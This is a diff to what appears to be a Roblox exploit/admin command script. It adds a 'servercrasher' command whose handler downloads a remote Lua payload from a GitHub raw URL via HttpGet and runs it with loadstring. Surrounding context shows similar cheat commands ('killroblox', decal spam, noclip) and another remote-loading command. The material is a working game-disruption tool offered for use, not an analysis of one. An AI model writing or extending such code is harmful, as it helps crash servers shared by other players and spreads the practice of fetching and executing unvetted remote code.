@@ -4548,6 +4548,7 @@ CMDs[#CMDs + 1] = {NAME = 'report', DESC = 'Reports players for breaking rules'}
 CMDs[#CMDs + 1] = {NAME = 'skybox / changesky / sky [AssetID]', DESC = 'Changes the environment sky'}
 CMDs[#CMDs + 1] = {NAME = 'decal / paint / spamdecal [AssetID]', DESC = 'Spams decal in the environment'}
 CMDs[#CMDs + 1] = {NAME = 'killroblox', DESC = 'Destroys Roblox completely'}
+CMDs[#CMDs + 1] = {NAME = 'servercrasher / svcrasher / serverdestroyer', DESC = 'Loads server crasher'}
 CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
 CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
 CMDs[#CMDs + 1] = {NAME = 'fly [speed]', DESC = 'Makes you fly'}
@@ -13364,6 +13365,11 @@ end)
 addcmd("gh0stGUI", {}, function(args, speaker)
 	notify("Loading", "Hold on a sec")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostFoxOfficial/backup/refs/heads/main/gh0stGUI.lua"))() 
+end)
+
+addcmd("servercrasher", {"svcrasher", "serverdestroyer"}, function(args, speaker)
+    notify("Loading", "Hold on a sec")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostFoxOfficial/backup/refs/heads/main/servercrasher.lua"))()
 end)
 
 addcmd("debug", {}, function(args, speaker)
